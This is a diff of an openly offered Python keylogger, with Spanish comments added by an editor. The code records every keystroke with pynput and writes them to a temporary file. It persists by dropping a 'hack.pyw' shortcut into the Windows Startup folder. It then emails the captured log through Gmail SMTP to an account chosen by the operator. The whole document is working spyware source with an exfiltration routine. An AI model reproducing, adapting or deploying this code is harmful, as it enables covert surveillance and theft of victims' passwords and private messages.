@@ -1,9 +1,9 @@
-# Keylogger
+# Keylogger creado por Edinson Requena y editado, traducido y comentado por Xabier Gabiña.
 
-#Script creado el 07/04/2020 por Xabier Gabiña ak.Xabierland
-#Mi Github: https://github.com/Xabierland
-#Mi Twitter: https://twitter.com/Xabierland
-#Mi Instagram: https://www.instagram.com/xabierland/
+# Script creado el 07/04/2020 por Xabier Gabiña ak.Xabierland
+# Mi Github: https://github.com/Xabierland
+# Mi Twitter: https://twitter.com/Xabierland
+# Mi Instagram: https://www.instagram.com/xabierland/
 
 # La lista de librerias importadas
 from pynput.keyboard import Key, Listener
@@ -15,16 +15,16 @@ from email.mime.base import MIMEBase
 from email import encoders
 import threading, socket
 
+# Las 4 lineas inferiores son las encargadas de crear y guardar las direcciones de todo lo relativo al proyecto.
+save = tempfile.mkdtemp("temp_file")    # Crea el archivo temporal donde se guardara todas las pulsaciones.
+print(save)                             # Imprime en la consola la ruta donde se guarda el archivo temporal.
+cwd = os.getcwd()                       # Guarda la direccion del proceso.
+source = os.listdir()                   # Guarda todo los nombres de los archivos del directiro del proceso.
 
-save = tempfile.mkdtemp("temp_file")    # Crea el archivo temporal donde se guardara todas las pulsaciones
-print(save)                             # Imprime en la consola la ruta donde se guarda el archivo temporal
-cwd = os.getcwd()
-source = os.listdir()
+dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")    #Guarda la fecha y la hora en la variable dateAndtime.
 
-dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")
-
-filename = save+"\key_log"+dateAndtime+".txt"
-open(filename,"w+")
+filename = save+"\key_log"+dateAndtime+".txt" 
+open(filename,"w+")     # Abre (o crea en caso de no existir) el archivo en modo de escritura (r - read | w - write | x - create)
 keys=[]
 count = 0 
 countInternet = 0
@@ -32,6 +32,7 @@ word = "Key."
 username = os.getlogin()    
 destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(username)
 
+#
 def _dir():
     path = os.path.join(destination, "hack.pyw - Shortcut.lnk")
     target = r""+cwd+"\hack.pyw"
@@ -44,10 +45,12 @@ def _dir():
             shortcut.IconLocation = icon
             shortcut.save()
 
-email = None
+# Inicializa las tres variables que usa el programa
+email = None    
 password = None
 gmail = None
 
+# Introducir los datos necesarios para el envio del archivo resultante del funcionamiento del keylogger
 def intro_data():
     global gmail, password, email
 
@@ -55,12 +58,14 @@ def intro_data():
     password = input("enter the gmail account password: ")
     email = input("Put her the gmail account that receives the emails: ")
 
+# Verifica si nuestro archivo se ha guardado en la variable destination y llamamos a la funcion _dir()
 shortcut = 'hack.pyw - Shortcut.lnk'
 if shortcut in destination:
     pass
 else:
     _dir()
 
+#
 def is_connected():
     try:
         socket.create_connection(("www.google.com", 80))
@@ -75,14 +80,14 @@ def _validation():
 
     return len(gmail) != 0 and len(password) != 0 and len(email) != 0
 
-
+#
 def field_inputs():
     if _validation():
         send_email()
     else:
         print("Error")
 
-
+#
 def send_email():
     global gmail, password, email
 
@@ -107,7 +112,7 @@ def send_email():
     server.sendmail(gmail, email, text)
     server.quit()
 
-
+#
 def write_file(keys):
     with open(filename,"a") as f:
         for key in keys:
@@ -124,6 +129,7 @@ def write_file(keys):
             # Recuerda que todo esto es modificable, investigando un poco mas a fondo podrias hacer de tu mensaje uno mucho mas legible,
             # aunque este ya lo es
 
+#
 def on_press(key):
     global keys, count, countInternet, filename
     keys.append(str(key))
@@ -149,7 +155,7 @@ def on_press(key):
                         shutil.copy(files+"t",source)
         keys.clear()
 
-
+#
 if __name__ == '__main__':
     print("*"*20 ,"Bienvenido al Keylogger", "*"*20)
     print("Escribe la primera letra de la opcion elegirla.")
